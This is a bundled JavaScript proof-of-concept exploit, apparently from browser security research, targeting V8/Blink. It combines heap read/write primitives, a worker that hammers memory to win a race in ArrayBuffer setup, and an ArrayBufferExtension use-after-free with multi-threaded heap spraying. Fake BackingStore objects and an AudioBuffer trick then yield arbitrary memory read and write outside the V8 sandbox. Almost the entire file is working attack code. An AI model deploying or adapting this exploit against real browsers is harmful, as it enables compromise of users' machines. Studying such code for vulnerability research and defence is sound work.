(async function() {
/* ############### START research:sandbox/arraybuf-ext-uaf/poc-blink.js ############### */
{


/* ############### START base:sbx_testing.js ############### */
{


//Provides our common set of heap primitives using the memory corruption API
var SANDBOX_BASE = Sandbox.base;

let heap_view = new DataView(new Sandbox.MemoryView(0, 0x100000000));
addrof = function addrof(obj) {
    return Sandbox.getAddressOf(obj) & ~1;
};
fakeobj = function fakeobj(addr) {
    return Sandbox.getObjectAt(addr & ~1);
};
hread32 = function hread32(addr) {
    return heap_view.getUint32(addr, true);
};
hwrite32 = function hwrite32(addr, val) {
    heap_view.setUint32(addr, val, true);
};
hread64 = function hread64(addr) {
    return heap_view.getBigUint64(addr, true);
};
hwrite64 = function hwrite64(addr, val) {
    heap_view.setBigUint64(addr, val, true);
};

// - we still have to hack the array buffer's size, since the Sandbox API truncates it 
let addr_heap_buf = addrof(heap_view.buffer);
hwrite64(addr_heap_buf + 0x14, 0xffffffffffffffffn);
hwrite64(addr_heap_buf + 0x1c, 0xffffffffffffffffn);



}
/* ############### END base:sbx_testing.js ############### */

/* ############### START research:sandbox/arraybuf-ext-uaf/exploit-blink.js ############### */
{



/* ############### START base:utils/log.js ############### */
{


var global = new Function('return this')();
global._log_impl ??= (script, msg) => console.log(`[${script ?? "main"}] ${msg}`);
global.log ??= msg => _log_impl('main', msg);

;

}
/* ############### END base:utils/log.js ############### */

/* start late pre-script hooks for research:sandbox/arraybuf-ext-uaf/exploit-blink.js */
let log = msg => _log_impl('research:sandbox/arraybuf-ext-uaf/exploit-blink.js', msg);
/* end pre-script hooks for research:sandbox/arraybuf-ext-uaf/exploit-blink.js */

/* ############### START base:utils/gc.js ############### */
{
let log = msg => _log_impl('base:utils/gc.js', msg);


/* ############### START base:utils/misc.js ############### */
{
let log = msg => _log_impl('base:utils/misc.js', msg);


spin = function spin(ms) {
    let end = Date.now() + ms;
    while(Date.now() < end);
};

sleep = function sleep(ms) {
    return new Promise(rslv => setTimeout(rslv, ms));
};

evt_loop_yield = function evt_loop_yield(ms) {
    return sleep(0);
}

}
/* ############### END base:utils/misc.js ############### */


const _EVICT_ARR = [];
evict_young_gen = function evict_young_gen() {
    /// Evicts objects from the young generation, moving them to the old generation
    /// Cons: young generation is in unknown state afterwards
    let x = 0;
    for(let i = 0; i < 5000; i++) {
        _EVICT_ARR.length = 0;
        _EVICT_ARR.length = 0x2000;
        _EVICT_ARR.fill(1337);
        
        x += _EVICT_ARR[0];
    }
    _EVICT_ARR.length = 0;
    return x;
};

flush_young_gen = function flush_young_gen() {
    /// Flushes the young generation, making it completely empty
    /// Cons: litters in the old generation

    //This method is so overly complicated behind the scenes, and it's 1:35am right now
    //So I can't be bothered to write docs
    let outer = [ [], [], [], [], [] ];
    for(let i = 0; i < outer.length; i++) outer[i].length = 0x100000;
    for(let i = 0; i < outer.length; i++) outer[i].fill(13.37);
    return outer;
};

function major_gc() {
    /// Triggers a major GC
    //Do this by creating an immense amount of temporary memory pressure
    let x = 0;
    for(let i = 0; i < 32; i++) {
        let buf = new ArrayBuffer(0x10000000);
        x += buf.length;
    }
    return x;
}

function refill_lab() {
    /// Refills the old generation's Linear Allocation Buffer (LAB)
    /// Allocations within it have a predictable layout (since it's just a bump allocator)
    const LARGEST_FREE_LIST_CATEGORY = 65536; // from free-list.h
    const LAB_REFILL_AMOUNT = 16 * 1024; // 16kB
    const NUM_FREE_LIST_PULLS = 5;

    //Create a bunch of big allocations in the old generation
    //The allocations are so big that it falls into the last / biggest free list category
    let arr = [];
    for(let i = 0; i < 5; i++) {
        arr.length = NUM_FREE_LIST_PULLS * (2*LARGEST_FREE_LIST_CATEGORY + LAB_REFILL_AMOUNT) / 4;
        arr.fill(1337);
        evict_young_gen();

        // - immediately free the allocation so it can be picked up by the GC
        arr.length = 0;
    }

    //Trigger a major GC to pick up our dead allocations
    major_gc();

    // - spin for a bit so things settle down
    spin(1000);

    //Now allocate a bunch less-big-but-still-big chunk of memory in the old generation
    //It also falls into the last free list category, so it takes the free list entry we inserted earlier
    //The scraps (= our desired refill amount) refills the LAB
    //If some other allocations sneaked their way before our free entry, that's OK; we specifically overallocated to eat up these allocations if needed
    for(let i = 0; i < NUM_FREE_LIST_PULLS; i++) { 
        arr.length = (2*LARGEST_FREE_LIST_CATEGORY) / 4;
        arr.fill(1337);
        evict_young_gen();
        arr.length = 0;
    }

    return arr;
}

const NEVER_GC = [];
function forget(obj) {
    NEVER_GC.push(obj);
}

delete forget;
delete major_gc;
delete refill_lab;
}
/* ############### END base:utils/gc.js ############### */

/* ############### START base:utils/heap-worker.js ############### */
{
let log = msg => _log_impl('base:utils/heap-worker.js', msg);



/* ############### START base:utils/basics.js ############### */
{
let log = msg => _log_impl('base:utils/basics.js', msg);


/* ############### START base:constants.js ############### */
{
let log = msg => _log_impl('base:constants.js', msg);


/// A list of well-known constants / offsets which we hardcode
/// Keep this list as small as possible!

//TODO: this has a hardcoded dependency on the platform (Android has a less-big sandbox)
//Look into ways of auto-detecting the shift amounts and adjusting based of that
;
;

;
;

;

}
/* ############### END base:constants.js ############### */

/* file base:utils/log.js already imported */
/* ############### START base:utils/binconv.js ############### */
{
let log = msg => _log_impl('base:utils/binconv.js', msg);


let conv_buf = new ArrayBuffer(8);
let conv_doubles = new Float64Array(conv_buf);
let conv_int32s = new Uint32Array(conv_buf);
let conv_int64s = new BigUint64Array(conv_buf);

f2il = function f2il(v) {
    conv_doubles[0] = v;
    return conv_int32s[0];
};
f2ih = function f2ih(v) {
    conv_doubles[0] = v;
    return conv_int32s[1];
};
f2bi = function f2bi(v) {
    conv_doubles[0] = v;
    return conv_int64s[0];
};
i2f = function i2f(l, h) {
    conv_int32s[0] = l;
    conv_int32s[1] = h; 
    return conv_doubles[0];
};
bi2f = function bi2f(v) {
    conv_int64s[0] = v; 
    return conv_doubles[0];
};

}
/* ############### END base:utils/binconv.js ############### */

/* file base:utils/misc.js already imported */

}
/* ############### END base:utils/basics.js ############### */

/* file base:utils/gc.js already imported */
/* ############### START base:utils/heap-utils.js ############### */
{
let log = msg => _log_impl('base:utils/heap-utils.js', msg);


/// Util functions to do various common things once the heap has been pwned

/* file base:constants.js already imported */

buffer_data_ptr = function buffer_data_ptr(buf) {
    return Number(hread64(addrof(buf) + 36) >> BigInt(24));
};

create_heapview_buffer = function create_heapview_buffer(addr = 0, size = null) {
    if(size == null) size = 0xffffffffffffffffn >> BigInt(29);

    let buf = new ArrayBuffer();
    let buf_addr = addrof(buf);

    hwrite64(buf_addr + 36, BigInt(addr) << BigInt(24));
    hwrite64(buf_addr + 20, BigInt(size) << BigInt(29));
    hwrite64(buf_addr + 28, BigInt(size) << BigInt(29));

    if(buf.byteLength != size) throw new Error("failed to hack heap view buffer");
    return buf;
}

}
/* ############### END base:utils/heap-utils.js ############### */

/* ############### START base:utils/worker.js ############### */
{
let log = msg => _log_impl('base:utils/worker.js', msg);


/* file base:utils/misc.js already imported */

let globals = new Function('return this')();

if(globals.Blob) {
    start_worker = function start_worker(src) {
        return new Worker(URL.createObjectURL(new Blob([src], { type: "application/javascript" })));
    };
} else {
    // - this must be D8, so we can just use its own API for launching a worker from a string
    start_worker = function start_worker(src) {
        return new Worker(src, { type: "string" });
    };
}

start_worker_func = function start_worker_func(declrs, func, ...args) {
    function stringify(val) {
        if(typeof val == "function") {
            //Dump the source code of the function / class
            return val.toString();
        } else if(Array.isArray(val)) {
            //We want to support arrays of functions / classes
            return `[${val.map(stringify).join(", ")}]`;
        } else if(typeof val == "bigint") {
            return `${val}n`;
        } else {
            return JSON.stringify(val);
        }
    }

    return start_worker(`${declrs.map(d => `${d}\n`).join("")}(${func})(${args.map(stringify).join(", ")})`);
};

ControlledWorker = class ControlledWorker {
    static start_new() {
        log(`Starting worker of type ${this.name}`);
        let worker = new this(false);
        return worker.init().then(() => worker);
    }

    static _worker_entry(cls) {
        //Create our own worker class instance
        let worker = new cls(true);
        worker.init().then(() => worker.run_worker()).then(() => worker.status[0xfff] = 2);
    }

    control_buf;
    control32;
    control64;
    status;

    worker_scope = null;

    get is_worker() { return this.worker_scope != null; }
    get should_run() { return this.status[0xfff] == 0; }

    constructor(is_worker) {
        if(is_worker) {
            this.worker_scope = new Function("return this")();
            return;
        }

        //Create a control buffer
        this.control_buf = new SharedArrayBuffer(0x3000);

        this.control32 = new Uint32Array(this.control_buf, 0x0000);
        this.control64 = new BigUint64Array(this.control_buf, 0x1000);
        this.status = new Uint8Array(this.control_buf, 0x2000);

        //Start the worker
        let declrs = [];
        for(let cls = new.target; cls != ControlledWorker; cls = cls.__proto__) declrs.unshift(cls.__proto__);

        this.worker = start_worker_func(declrs, "ControlledWorker._worker_entry", new.target);
    }

    async init() {
        if(!this.is_worker) {
            //Send the control buffer over to the worker
            this.worker.postMessage(this.control_buf);

            // - wait for the worker to receive it
            while(!this.status[0]) await evt_loop_yield();
            this.status[0] = 0; 
        } else {
            //Receive the control buffer
            this.control_buf = await this.recv_msg();
            this.control32 = new Uint32Array(this.control_buf, 0x0000);
            this.control64 = new BigUint64Array(this.control_buf, 0x1000);
            this.status = new Uint8Array(this.control_buf, 0x2000);

            // - signal the main thread that we received the control buffer
            this.status[0] = 1;
            while(this.status[0]);
        }
    }

    run_worker() {
        throw new Error("run_worker wasn't implemented");
    }

    recv_msg() {
        if(!this.is_worker) throw new Error("recv_msg can only be called from the worker");
        return new Promise((resolve, _) => {
            this.worker_scope.onmessage = ev => {
                this.worker_scope.onmessage = null;
                resolve(ev.data);
            };
        });
    }

    terminate() {
        this.status[0xfff] = 1;
        while(this.status[0xfff] != 2);
        this.worker.terminate();
    }
};

delete stringify;
}
/* ############### END base:utils/worker.js ############### */


HeapWorker = class HeapWorker extends ControlledWorker {
    static NUM_SMUGGLE_ARRAYS = 0x40;
    static SMUGGLE_ARRAY_SIZE = 0x100000;
    static SMUGGLE_SENTINEL = 0x13374242;

    heap_view = null;

    constructor(is_worker) {
        //Isolates are meant to be, well, isolated, so there's no easy way for us to obtain the address of its objects, even though they are in the same sandbox as ours
        //We also can't smuggle them through using (Shared)ArrayBuffers, since those only transfer the backing store, not the actual array object
        //(in the future we might be able to use Atomics.Mutex / JSSharedArray objects, but those are currently locked behind v8_flags.harmony_structs)
        //However, all worker isolates share the same BoundedPageAllocator object for allocating new pages within the sandbox, and the allocator maintains a free list
        //As such we can "leak" the address ahead of time by allocating a new page, inserting it back into the freelist, then starting the worker
        //We use the large object space for this, since all objects in it have their own page allocations
        //We also allocate multiple objects to increase the chances that just a single one of our main-thread allocations becomes a worker allocation
        let arrays = [];
        for(let i = 0; i < HeapWorker.NUM_SMUGGLE_ARRAYS; i++) {
            let arr = [];
            arr.length = HeapWorker.SMUGGLE_ARRAY_SIZE;
            arr.fill({});
            arrays.push(arr);
        }

        if(!is_worker) {
            //Keep track of the elements array of each large array; each one should be in the large object space
            let elems_addrs = [];
            for(let arr of arrays) {
                let addr = hread32(addrof(arr) + 8) & ~1;
                if(addr & 0xfff != 0x10) throw new Error("large array elements didn't end up in the large object space");
                elems_addrs.push(addr);
            }

            //Free the array allocations again, to put the element buffer region back into the freelist
            arrays.length = 0;
            arrays = null;
            major_gc(); // - we might have triggered a scavenger run earlier because of the memory pressure, moving some of our arrays into the old generation

            //Finally start the worker
            super(false);
            this._smuggle_elems_addrs = elems_addrs;
        } else {
            //We need the arrays later
            super(true);
            this._smuggle_arrays = arrays;
        }
    }

    async init() {
        await super.init();

        //If this is sandbox testing we have an easy life
        if(new Function("return this;")().Sandbox) {
            if(!this.is_worker) return;

            this.heap_view = new Sandbox.MemoryView(0, 0x100000000);
            let heap_view = new DataView(this.heap_view);
        
            this.worker_scope.addrof = function addrof(obj) {
                return Sandbox.getAddressOf(obj) & ~1;
            };
            this.worker_scope.fakeobj = function fakeobj(addr) {
                return Sandbox.getObjectAt(addr & ~1);
            };
            this.worker_scope.hread32 = function hread32(addr) {
                return heap_view.getUint32(addr, true);
            };
            this.worker_scope.hwrite32 = function hwrite32(addr, val) {
                heap_view.setUint32(addr, val, true);
            };
            this.worker_scope.hread64 = function hread64(addr) {
                return heap_view.getBigUint64(addr, true);
            };
            this.worker_scope.hwrite64 = function hwrite64(addr, val) {
                heap_view.setBigUint64(addr, val, true);
            };

            return;
        }

        if(!this.is_worker) {
            //Wait for the worker to be ready
            while(!this.status[0]);

            //Allocate some more arrays to ensure all the earlier pages are mapped
            let arrays = [];
            for(let i = 0; i < HeapWorker.NUM_SMUGGLE_ARRAYS; i++) {
                let arr = [];
                arr.length = HeapWorker.SMUGGLE_ARRAY_SIZE;
                arr.fill({});
                arrays.push(arr);
            }

            //Look for the smuggle sentinel in all pages
            let smuggled_elems_addr = null;
            for(let addr of this._smuggle_elems_addrs) {
                if(hread32(addr + 8) == (HeapWorker.SMUGGLE_SENTINEL << 1)) {
                    //We found the elements buffer of one of the worker's smuggle arrays!
                    smuggled_elems_addr = addr;
                    break;
                }
            }

            if(smuggled_elems_addr == null) throw new Error("array elements smuggle failed; didn't find sentinel");
            log(` - smuggled array elements addr: 0x${smuggled_elems_addr.toString(16)}`);
            
            //Turn the worker's ArrayBuffer into a full heap view buffer
            let worker_buf_addr = hread32(smuggled_elems_addr + 8 + 4) & ~1;
            log(` - worker heap view buffer addr: 0x${worker_buf_addr.toString(16)}`);

            hwrite64(worker_buf_addr + 36, 0x0000000000000000n);
            hwrite64(worker_buf_addr + 20, 0xffffffffffffffffn);
            hwrite64(worker_buf_addr + 28, 0xffffffffffffffffn);

            //Provide the worker with the address of its smuggled elements buffer so that it can recyle it to bootstrap its addrof/fakeobj primitives
            hwrite32(smuggled_elems_addr + 8 + 0, (HeapWorker.SMUGGLE_SENTINEL + 1) << 1);
            hwrite32(smuggled_elems_addr + 8 + 4, smuggled_elems_addr << 1);

            //Signal the worker that we're done
            this.status[0] = 0;
        } else {
            //Allocate an ArrayBuffer as our heap view buffer; the main thread will modify it to be able to access the entire heap
            //Place it after a sentinel in each array which the main thread can look for
            this.heap_view = new ArrayBuffer();
            for(let arr of this._smuggle_arrays) {
                arr[0] = HeapWorker.SMUGGLE_SENTINEL;
                arr[1] = this.heap_view;
            }

            //Wait for the main thread to perform the smuggle
            this.status[0] = 1;
            while(this.status[0]);

            if(this.heap_view.byteLength == 0) throw new Error("smuggled failed; heap view buffer hasn't been modified");

            //The chosen smuggled arrays should also contain some additional information now
            let smuggle_arr = null;
            for(let arr of this._smuggle_arrays) {
                if(arr[0] == HeapWorker.SMUGGLE_SENTINEL) continue;
                if(arr[0] != HeapWorker.SMUGGLE_SENTINEL + 1) throw new Error(`unexpected sentinel in smuggle array: 0x${arr[0].toString(16)}`);
                smuggle_arr = arr;
                break;
            }
            delete this._smuggle_arrays;

            // - we recycle the smuggle array for our addrof/fakeobj primitives, since it's in LO space and as such won't move
            let smuggle_elements_addr = smuggle_arr[1];
            if(typeof smuggle_elements_addr != "number" || (smuggle_elements_addr & 0x3) != 0) throw new Error(`invalid smuggled array elements addr: ${smuggle_elements_addr}`);

            //Bootstrap the worker's heap primitives using the smuggled heap view buffer
            let heap_view = new DataView(this.heap_view);

            this.worker_scope.addrof = function addrof(obj) {
                smuggle_arr[0] = obj;
                return hread32(smuggle_elements_addr + 8) & ~1;
            };
            this.worker_scope.fakeobj = function fakeobj(addr) {
                hwrite32(smuggle_elements_addr + 8, addr | 1);
                var obj = smuggle_arr[0];
                smuggle_arr[0] = {}; //defuse any potential GCs
                return obj;
            };

            this.worker_scope.hread32 = function hread32(addr) {
                return heap_view.getUint32(addr, true);
            };
            this.worker_scope.hwrite32 = function hwrite32(addr, val) {
                heap_view.setUint32(addr, val, true);
            };
            this.worker_scope.hread64 = function hread64(addr) {
                return heap_view.getBigUint64(addr, true);
            };
            this.worker_scope.hwrite64 = function hwrite64(addr, val) {
                heap_view.setBigUint64(addr, val, true);
            };
        }
    }
};

WriteHammer = class WriteHammer extends HeapWorker {
    write_to(addr, val) {
        if(this.control32[0] != 0) this.stop();

        this.control32[1] = val;
        this.control32[0] = addr;
        while(this.status[0] != 1);

        spin(10); // - give the worker a bit to properly start hammering the address
    }

    stop() {
        this.control32[0] = 0;
        while(this.status[0] != 0);
    }

    run_worker() {
        //Move control32 into a local, slightly speeding up access times
        let control32 = this.control32;

        while(true) {
            //Wait until we get an address to hammer
            while(this.should_run && !control32[0]);
            if(!this.should_run) break;

            //Hammer the address until we should stop
            let addr = control32[0];
            let val = control32[1];
            let arr = new Uint32Array(this.heap_view, addr, 4);

            this.status[0] = 1;
            while(control32[0]) arr[0] = val;
            this.status[0] = 0;
        }
    }

    terminate() {
        this.stop();
        super.terminate();
    }
};

}
/* ############### END base:utils/heap-worker.js ############### */


//Prepare a fake BackingStore for later
let fake_backing_store = new ArrayBuffer(0x1000);
let fake_backing_store_addr = SANDBOX_BASE + BigInt(buffer_data_ptr(fake_backing_store));
let fake_backing_store_view = new DataView(fake_backing_store);

fake_backing_store_view.setBigUint64(0x00, fake_backing_store_addr, true);  //buffer_start_
fake_backing_store_view.setBigUint64(0x08, 0x1337n, true);                  //byte_length_
fake_backing_store_view.setBigUint64(0x10, 0x1337n, true);                  //max_byte_length_
fake_backing_store_view.setBigUint64(0x18, 0x1337n, true);                  //byte_capacity_

log(`fake BackingStore address: 0x${fake_backing_store_addr.toString(16)}`);

//Prepare a fake ArrayBufferExtension spray for later
let fake_array_buf_ext = new ArrayBuffer(0x30);
let fake_array_buf_ext_view = new DataView(fake_array_buf_ext);

fake_array_buf_ext_view.setBigUint64(0x00, 0n, true);                               //owning_table_
fake_array_buf_ext_view.setUint32(0x08, 0, true);                                   //ept_entry_
fake_array_buf_ext_view.setUint8(0x0c, 0, true);                                    //marked_
fake_array_buf_ext_view.setUint8(0x0d, 0, true);                                    //young_gc_state_
fake_array_buf_ext_view.setBigUint64(0x10, fake_backing_store_addr, true);          //backing_store_ data ptr
fake_array_buf_ext_view.setBigUint64(0x18, fake_backing_store_addr + 0x100n, true); //backing_store_ refcnts ptr
fake_array_buf_ext_view.setBigUint64(0x20, 0n, true);                               //next_

//Prepare all relevant workers for later
let hammer = await WriteHammer.start_new();

class HeapSprayer {
    static NUM_SPRAY_THREADS = 35;

    static async create() {
        let sprayer = new HeapSprayer();

        //Start a bunch of spray workers
        async function spray_worker(id) {
            //Receive the control buffer from the main thread
            let msg = await new Promise(rslv => onmessage = rslv);
            onmessage = null;

            let payload = new Uint8Array(msg.data);
            let ctrl = new Int32Array(msg.data, 0x100);
            ctrl[2] = 1; // - tell the main thread we're ready

            while(true) {
                //Wait until it's go time
                while(!ctrl[0]) Atomics.wait(ctrl, 0, 0);
                let spray_len = ctrl[0];

                // - wait until it's specifically our thread's turn
                while(ctrl[1] != id);

                //Spray using the std::vector<uint8_t> allocated by String.fromCodePoint
                let spray = payload.subarray(0, spray_len);

                let spray_cnt = 200; // - setting this too high causes a stack overflow
                function spray_rec() {
                    if(spray_cnt-- <= 0) {
                        //We can't allocate anymore; wait until the main thread tells us to stop
                        ctrl[1]++;

                        // - wait until we should free everything & all threads before us freed
                        while(ctrl[0]) Atomics.wait(ctrl, 0, spray_len);
                        while(ctrl[1] > id+1);
                    } else {
                        //Recursively invoke fromCodePoint, keeping the current spray buffer alive until we return
                        String.fromCodePoint(...spray, { valueOf: spray_rec });
                    }
                    return 0x21;
                }
                spray_rec();

                ctrl[1]--;
            }
        }

        for(let i = 0; i < HeapSprayer.NUM_SPRAY_THREADS; i++) {
            //Start a worker, send it the control buffer, and wait till it's ready
            let worker = start_worker_func([flush_young_gen, sleep], spray_worker, i);

            worker.postMessage(sprayer.shared_buf);
            while(!sprayer.control[2]) await evt_loop_yield();

            // - reset the done flag for the next worker
            sprayer.control[2] = 0;
        }

        return sprayer;
    }

    constructor() {
        this.shared_buf = new SharedArrayBuffer(0x200);
        this.payload = new Uint8Array(this.shared_buf, 0);
        this.control = new Int32Array(this.shared_buf, 0x100);
    }

    spray(payload) {
        //Copy over the spray payload to the control buffer, then start the spray
        this.payload.set(new Uint8Array(payload));
        Atomics.store(this.control, 0, payload.byteLength);
        Atomics.notify(this.control, 0);

        //Wait for all threads to have completed their spray
        while(Atomics.load(this.control, 1) < HeapSprayer.NUM_SPRAY_THREADS);
    }

    free_spray() {
        //Stop the spray
        Atomics.store(this.control, 0, 0);
        Atomics.notify(this.control, 0);

        //Wait for all threads to have freed their spray
        while(Atomics.load(this.control, 1) > 0);
    }
}

log("preparing heap sprayer");
let heap_sprayer = await HeapSprayer.create();

//Allocate a victim ArrayBufferExtension which we'll target
//To achieve this, we allocate a bunch of ArrayBufferExtensions in a row, and only keep the middle one
log("spraying ArrayBufferExtensions");

let bufs = [];
for(let i = 0; i < 0x80000; i++) bufs[i] = new ArrayBuffer(0x10);
flush_young_gen();
for(let i = 0; i < bufs.length; i++) bufs[i] = bufs[i].transfer();
major_gc();

//Now that we allocated our target extensions, we can grab our victim extension
let victim_buf = bufs.pop();

//Read the victim extension's handle
let victim_ext = hread32(addrof(victim_buf) + 0x2c);
log(`victim ArrayBufferExtension handle: 0x${victim_ext.toString(16)}`);

//Prepare for the following section of the exploit
//During it, we must not trigger any GCs to not mess up the final step, so we flush the young generation to give us as much time until memory runs out as we can get
flush_young_gen();

//Allocate a heap-backed TypedArray, and obtain the address of its associated ArrayBuffer before it is initalized 
let pwn_arr = new Uint8Array(0x21);
pwn_arr[0] = 0x21;

let addr_pwn_arr_buf = hread32(addrof(pwn_arr) + 0x10) & ~1;
log(`TypedArray ArrayBuffer addr: 0x${addr_pwn_arr_buf.toString(16)}`);
if(hread32(addr_pwn_arr_buf + 0x2c) != 0) throw new Error("TypedArray ArrayBufferExtension isn't null");

//Initialize the typed array's ArrayBuffer; this will call JSArrayBuffer::Setup, which will allocate a new ArrayBufferExtension, and use register it with the ArrayBufferSweeper later down the line
//We try to overwrite the extension handle during this window of time after the allocation of the array buffer extension, but before its registration
//If we win this race, this will insert ArrayBufferExtension into the young generation as well, effectively making it part of both generations
hammer.write_to(addr_pwn_arr_buf + 0x2c, victim_ext);
pwn_arr.buffer; // - trigger the initialization of the ArrayBuffer
hammer.stop();

//Ensure we won the race
//This check works since if we won the race, the victim ArrayBufferExtension's associated backing_store will have been overwritten, and ArrayBuffer.transfer() reads the byte length from the backing store directly
if(victim_buf.transfer().byteLength != 0x21) throw new Error("didn't win TypedArray race condition");

log("won JSArrayBuffer::Setup race");

//Ensure there are slot spans with enough entries to fulfill any requests
//Without this, our UaF would make our victim slot span the active slot span, which mean it won't survive long
//This also serves to flush our victim extension out of the thread cache after its freed from the young generation sweep
log("allocating sacrificial ArrayBufferExtensions");

let ext_spray_buf = new ArrayBuffer(0x10);
for(let i = 0; i < 0x600; i++) ext_spray_buf = ext_spray_buf.transfer();
ext_spray_buf = null;

//Trigger the ArrayBufferSweeper using a minor GC
//Ever since we started this process, we should not have ran a GC, which means this sweep will free all young generation sacrifical ArrayBufferExtensions + the victim extension in one go
log("triggering young generation ArrayBufferSweeper sweep");

pwn_arr = null;
victim_buf = null;
evict_young_gen();
await sleep(1000); // - give ArrayBufferSweeper some time to run

//The sacrificial ArrayBufferExtensions ensured our victim extension ended up in its own free list; however, they can't undo the damage done by the thread cache's poisoning
//As such spray null bytes on the heap to ensure we don't crash on the next major GC
//This also conveniently replaces the allocation being UaFed with a much simpler one, without complex destructor logic which can blow up on us
log("spraying nulls to repair victim ArrayBufferExtension");

heap_sprayer.spray(new Uint8Array(0x30).fill(0).buffer);

//Allocate a bunch of sacrificial ArrayBufferExtensions in the old generation
//Their purpose is the same as earlier (i.e. flush the tcache)
//They are picked up by the sweeper even though we truncated the list using our spray since our fake entry is at the tail of the old generation list, meaning new entries still get properly appended
log("allocating sacrificial old generation ArrayBufferExtensions");

let tcache_flush = [];
for(let i = 0; i < 0x280; i++) tcache_flush[i] = new ArrayBuffer(0x10);
evict_young_gen();

//Trigger a major GC; this will trigger a sweep of all old generation ArrayBufferExtensions, cause the victim ArrayBufferExtension to be freed again
log("triggering old generation ArrayBufferSweeper sweep");

tcache_flush = null;
major_gc();
await sleep(1000); // - give ArrayBufferSweeper some time to run

//Allocate a bunch of ArrayBufferExtensions to hopefully reclaim the memory which we have a dangling reference to with an ArrayBufferExtension
//Most cruicially, this creates a new external pointer handle which points to this ArrayBufferExtension
//We can then free our spray allocations, which also frees the ArrayBufferExtension again, but cruicially it does not destroy the created handle!
//This way we can then spray again to control the same memory slot again, giving us full control over an ArrayBufferExtension with a valid handle
log("reclaiming victim ArrayBufferExtension with proper ArrayBufferExtensions");
let ext_spray = bufs.map(b => b.transfer());
bufs = null;

log("freeing original spray");
heap_sprayer.free_spray();

log("spraying fake ArrayBufferExtension contents");
heap_sprayer.spray(fake_array_buf_ext);

//Transfer all of our sprayed extensions; if everything went according to plan, one of them now holds our sprayed data
//By doing this we smuggle the contained BackingStore pointer into a "clean" extension
log("recovering fake BackingStore");

let fake_buf = null;
for(let i = 0; i < ext_spray.length; i++) {
    ext_spray[i] = ext_spray[i].transfer();
    if(ext_spray[i].byteLength == 0x1337) {
        fake_buf = ext_spray[i];
        ext_spray[i] = null;
        break;
    }
}

if(fake_buf == null) throw new Error("failed to recover fake BackingStore ArrayBuffer");

//Cleanup
log("cleaning up...");
major_gc();

//With pure V8, we would be screwed now; we have control over a BackingStore, but almost nothing reads buffer_start_ directly
//Luckily we have access to Blink / DOM APIs, and Blink's mirror DOMArrayBuffer(View) classes do use this field a lot :p
const AUDIO_BUF = new AudioBuffer({ length: 2, numberOfChannels: 1, sampleRate: 3000 });

vread32 = function vread32(addr) {
    fake_backing_store_view.setBigUint64(0x00, addr, true);     //buffer_start_
    fake_backing_store_view.setBigUint64(0x08, 4n, true);       //byte_length_
    fake_backing_store_view.setBigUint64(0x10, 4n, true);       //max_byte_length_

    let val_arr = new Uint32Array(1);
    AUDIO_BUF.copyToChannel(new Float32Array(fake_buf, 0, 1), 0, 0);
    AUDIO_BUF.copyFromChannel(new Float32Array(val_arr.buffer, 0, 1), 0, 0);
    return val_arr[0];
};
vread64 = function vread64(addr) {
    fake_backing_store_view.setBigUint64(0x00, addr, true);     //buffer_start_
    fake_backing_store_view.setBigUint64(0x08, 8n, true);       //byte_length_
    fake_backing_store_view.setBigUint64(0x10, 8n, true);       //max_byte_length_

    let val_arr = new BigUint64Array(1);
    AUDIO_BUF.copyToChannel(new Float32Array(fake_buf, 0, 2), 0, 0);
    AUDIO_BUF.copyFromChannel(new Float32Array(val_arr.buffer, 0, 2), 0, 0);
    return val_arr[0];
};

vwrite32 = function vwrite32(addr, val) {
    fake_backing_store_view.setBigUint64(0x00, addr, true);     //buffer_start_
    fake_backing_store_view.setBigUint64(0x08, 4n, true);       //byte_length_
    fake_backing_store_view.setBigUint64(0x10, 4n, true);       //max_byte_length_

    AUDIO_BUF.copyToChannel(new Float32Array(new Uint32Array([val]).buffer, 0, 1), 0, 0);
    AUDIO_BUF.copyFromChannel(new Float32Array(fake_buf, 0, 1), 0, 0);
};
vwrite64 = function vwrite64(addr, val) {
    fake_backing_store_view.setBigUint64(0x00, addr, true);     //buffer_start_
    fake_backing_store_view.setBigUint64(0x08, 8n, true);       //byte_length_
    fake_backing_store_view.setBigUint64(0x10, 8n, true);       //max_byte_length_

    AUDIO_BUF.copyToChannel(new Float32Array(new BigUint64Array([val]).buffer, 0, 2), 0, 0);
    AUDIO_BUF.copyFromChannel(new Float32Array(fake_buf, 0, 2), 0, 0);
};

log(" - success!");


delete spray_rec;
delete spray_worker;
}
/* ############### END research:sandbox/arraybuf-ext-uaf/exploit-blink.js ############### */

/* start late pre-script hooks for research:sandbox/arraybuf-ext-uaf/poc-blink.js */
let log = msg => _log_impl('research:sandbox/arraybuf-ext-uaf/poc-blink.js', msg);
/* end pre-script hooks for research:sandbox/arraybuf-ext-uaf/poc-blink.js */

vwrite64(0x13371377000n, 0x1234n);

}
/* ############### END research:sandbox/arraybuf-ext-uaf/poc-blink.js ############### */

})();